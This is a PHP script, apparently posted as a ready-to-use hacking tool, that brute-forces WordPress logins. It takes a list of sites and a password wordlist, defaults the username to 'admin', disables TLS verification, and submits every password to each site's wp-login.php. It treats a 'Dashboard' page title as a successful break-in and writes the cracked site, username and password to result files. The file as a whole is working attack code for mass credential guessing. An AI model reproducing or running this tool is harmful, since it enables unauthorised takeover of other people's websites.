<?php
error_reporting(0);
/*
Coded By Hevnen
https://t.me/hevnen
https://wwww.facebook.com/hevnen
https://github.com/hevnen

You can you this script in your terminal.


If you want to run the script on the server, please make this $terminal variable false*/
$terminal = true;




/*if you want to use this file on your web server... please set all files manually else leave empty */

/* Set Password File */
$wordlist = "";
/*Set site list*/
$sitelist = "";











/*Please don't touch this script*/
/*=================Function================*/

//URL filter
function filter_url($input) {
    if(substr($input,0,7) == "http://" || substr($input,0,8) == "https://") {
        $parse_url = parse_url($input);
        
        $url = $parse_url['scheme']."://".$parse_url['host'];
        return $url;
    } else {
        $urla = "http://".$input;
        return $urla;
    }
}





//GET Source code
function source_code($url) {
    $curl = curl_init($url);
    curl_setopt($curl,  CURLOPT_RETURNTRANSFER, TRUE);
    $config['useragent'] = 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0';
    curl_setopt($curl, CURLOPT_USERAGENT, $config['useragent']);
    curl_setopt($curl, CURLOPT_REFERER,$url);
    $config['cookie_file'] = 'cookie.txt';
    curl_setopt($curl, CURLOPT_COOKIEFILE, $config['cookie_file']);
    curl_setopt($curl, CURLOPT_COOKIEJAR, $config['cookie_file']);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
    
    $response = curl_exec($curl);
    return $response;
}




//get title
function get_title($data) {
    $dom = new DOMDocument("1.0","UTF-8");
    @$dom->loadHTML($data);
    
    $dom->preserveWhiteSpace = false;
    
    $title = $dom->getElementsByTagName('title')->item(0)->nodeValue;
    return $title;
}






// POST login request
function login($url,$username,$password) {
    $urla = str_replace("wp-login.php",'',$url);
    $post = [
    'log' => $username,
    'pwd' => $password,
    'wp-submit'   => 'Log In',
    'redirect_to' => $urla."wp-admin",
    'testcookie' => '1'
    ];
    
    $curl = curl_init($url);
    curl_setopt($curl,  CURLOPT_RETURNTRANSFER, TRUE);
    $config['useragent'] = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36';
    curl_setopt($curl, CURLOPT_USERAGENT, $config['useragent']);
    curl_setopt($curl, CURLOPT_REFERER,$url);
    $config['cookie_file'] = 'cookie.txt';
    curl_setopt($curl, CURLOPT_COOKIEFILE, $config['cookie_file']);
    curl_setopt($curl, CURLOPT_COOKIEJAR, $config['cookie_file']);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $post);
    
    $response = curl_exec($curl);
    return $response;
}



function terminal_home() {
    system("clear");
    
    $wordlist = readline("\nInput Wordlist: ");
    $sitelist = readline("\nInput Sitelist: ");
    $username = readline("\nInput username: ");
    
    $list = array("wordlist"=>$wordlist,"sitelist"=>$sitelist,"username"=>$username);
    return $list;
}

/*------------------END-------------------*/

if($terminal == false) {
    if(file_exists($wordlist) && file_exists($sitelist)) {
        
        /* GET all File*/
        $wordlist_file = file_get_contents($wordlist);
        $sitelist_file = file_get_contents($sitelist);
        $result_file = fopen($result,"a");
    } else {
        echo("Error: all files are not exists");
        exit;
    }
} elseif ($terminal == true) {
    $file = terminal_home();
    if(file_exists($file['wordlist']) && file_exists($file['sitelist'])) {
        $wordlist_file = file_get_contents($file['wordlist']);
        $sitelist_file = file_get_contents($file['sitelist']);
        $username = $file['username'];
    } else {
        echo("\nall files are not exists\n");
        exit;
    }
    
} else {
    echo("Error");
    exit;
}





$sites = explode("\n",$sitelist_file);


foreach ($sites as $site) {
    $site = filter_url($site);

    $url = $site."/wp-login.php";
    
    $trying_file = fopen("trying.txt","a");
    fwrite($trying_file,"$url\n");
    
    $login_source = source_code($url);
    if(!empty($login_source)) {
    $login_title = get_title($login_source);
    }
    $passwords = explode("\n",$wordlist_file);
    
    
    if(empty($username)) {
        $username = "admin";
    }
    print("\n\n\nTrying: $site\n");
    foreach ($passwords as $pass) {
        print("* $pass\n");
        $dashboard_source = login($url,$username,$pass);
        if(!empty($dashboard_source)) {
        $dashboard_title = get_title($dashboard_source);
        }
        if(!empty($login_title) && !empty($dashboard_title)) {
        if(substr($dashboard_title,0,9) == "Dashboard") {
            echo("\nFound!\nSite: $url\nPassword: $pass\nUsername: $username\n");
            fwrite(fopen("results.txt","a"),"\nFound!\nSite: $url\nPassword: $pass\nUsername: $username");
            break;
        }
            if($login_title !== $dashboard_title) {
                fwrite(fopen("maybe.txt","a"),"Maybe: $url\nPass: $pass\nUser: $username\nTitle: $dashboard_title\n\n\n");
            }
        }
    }
}
?>